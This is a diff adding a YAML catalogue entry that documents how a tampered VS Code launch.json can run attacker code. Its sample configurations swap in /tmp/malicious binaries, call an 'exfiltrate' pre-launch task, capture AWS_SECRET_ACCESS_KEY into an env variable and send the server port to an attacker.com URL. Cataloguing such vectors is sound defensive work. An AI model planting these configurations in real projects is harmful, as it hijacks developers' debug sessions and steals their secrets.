@@ -1,0 +1,137 @@
+name: VS Code Launch Configuration
+id: vscode-launch
+description: >
+  .vscode/launch.json defines debug configurations that control what binary
+  is executed when a developer starts a debug session in the editor. Attackers can replace
+  or inject configurations that run a malicious program instead of, or in
+  addition to, the legitimate one.
+author: LOC Team
+tags:
+  - vscode
+  - ide
+  - code-execution
+
+exploitation: |
+  VS Code reads `.vscode/launch.json` to populate the Run & Debug panel. Each
+  configuration can specify its own `program`, `runtimeExecutable`, `preLaunchTask`,
+  and environment variables, giving an attacker full control over what runs when
+  a developer hits F5.
+
+  ### Replace the launched program
+
+  Point `program` at a malicious binary or script. The developer sees the
+  familiar debug UI and assumes they are running their own code.
+
+  ```json
+  {
+    "version": "0.2.0",
+    "configurations": [
+      {
+        "name": "Launch Program",
+        "type": "node",
+        "request": "launch",
+        "program": "/tmp/malicious.js"
+      }
+    ]
+  }
+  ```
+
+  ### Use runtimeExecutable to swap the interpreter
+
+  `runtimeExecutable` replaces the runtime itself, so every debug session
+  spawns the attacker-supplied binary.
+
+  ```json
+  {
+    "version": "0.2.0",
+    "configurations": [
+      {
+        "name": "Launch Program",
+        "type": "node",
+        "request": "launch",
+        "runtimeExecutable": "/tmp/malicious-node",
+        "program": "${workspaceFolder}/index.js"
+      }
+    ]
+  }
+  ```
+
+  ### preLaunchTask / postDebugTask for side-channel execution
+
+  Reference a task defined in `tasks.json` (or inline via a compound
+  configuration) that runs a shell command before or after every debug session.
+  Combined with the `vscode-tasks` vector this achieves execution without
+  touching the program path at all.
+
+  ```json
+  {
+    "version": "0.2.0",
+    "configurations": [
+      {
+        "name": "Launch Program",
+        "type": "node",
+        "request": "launch",
+        "program": "${workspaceFolder}/index.js",
+        "preLaunchTask": "exfiltrate"
+      }
+    ]
+  }
+  ```
+
+  ### Inject environment variables
+
+  Sensitive environment variables from the host shell (API keys, tokens) can be
+  captured and forwarded via `env` or `envFile`. Combined with a crafted
+  `program`, the stolen values are exfiltrated on every debug run.
+
+  ```json
+  {
+    "version": "0.2.0",
+    "configurations": [
+      {
+        "name": "Launch Program",
+        "type": "node",
+        "request": "launch",
+        "program": "${workspaceFolder}/index.js",
+        "env": {
+          "STOLEN_TOKEN": "${env:AWS_SECRET_ACCESS_KEY}"
+        }
+      }
+    ]
+  }
+  ```
+
+  ### Hidden / camouflaged configurations
+
+  A malicious configuration can be named to look like a legitimate one
+  (e.g. "Debug Tests", "Attach to Process") or placed as a second entry
+  after a real configuration so it is not immediately visible in the panel.
+  The `serverReadyAction` field can also be abused to open an attacker URL
+  automatically once a server process is detected as ready.
+
+  ```json
+  {
+    "version": "0.2.0",
+    "configurations": [
+      {
+        "name": "Debug Tests",
+        "type": "node",
+        "request": "launch",
+        "program": "${workspaceFolder}/index.js",
+        "serverReadyAction": {
+          "action": "openExternally",
+          "pattern": "listening on port ([0-9]+)",
+          "uriFormat": "https://attacker.com/log?port=%s"
+        }
+      }
+    ]
+  }
+  ```
+
+references:
+  - url: https://code.visualstudio.com/docs/editor/debugging
+    description: VS Code Debugging documentation
+  - url: https://code.visualstudio.com/docs/editor/variables-reference
+    description: VS Code Variables reference (env var expansion in launch configs)
+  - url: https://code.visualstudio.com/docs/editor/workspace-trust
+    description: VS Code Workspace Trust documentation
